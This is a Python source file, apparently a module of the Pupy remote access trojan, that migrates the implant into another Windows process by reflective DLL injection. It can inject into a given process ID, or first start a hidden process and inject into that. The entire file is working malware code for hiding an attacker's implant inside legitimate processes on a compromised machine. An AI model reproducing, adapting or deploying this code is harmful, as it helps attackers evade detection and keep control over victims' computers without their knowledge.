# -*- coding: UTF8 -*-
from pupylib.PupyModule import *
import pupygen
import os.path
import time
from modules.lib.windows.migrate import migrate

__class_name__="MigrateModule"


@config(cat="manage", compat="windows")
class MigrateModule(PupyModule):
	""" Migrate pupy into another process using reflective DLL injection """
	max_clients=1
	dependencies=["psutil", "pupwinutils.processes"]
	def init_argparse(self):
		self.arg_parser = PupyArgumentParser(prog="migrate", description=self.__doc__)
		group = self.arg_parser.add_mutually_exclusive_group(required=True)
		group.add_argument('-c', '--create', metavar='<exe_path>',help='create a new process and inject into it')
		group.add_argument('pid', nargs='?', type=int, help='pid')

	def run(self, args):
		pid=None
		if args.create:
			p=self.client.conn.modules['pupwinutils.processes'].start_hidden_process(args.create)
			pid=p.pid
			self.success("%s created with pid %s"%(args.create,pid))
		else:
			pid=args.pid
		migrate(self, pid)



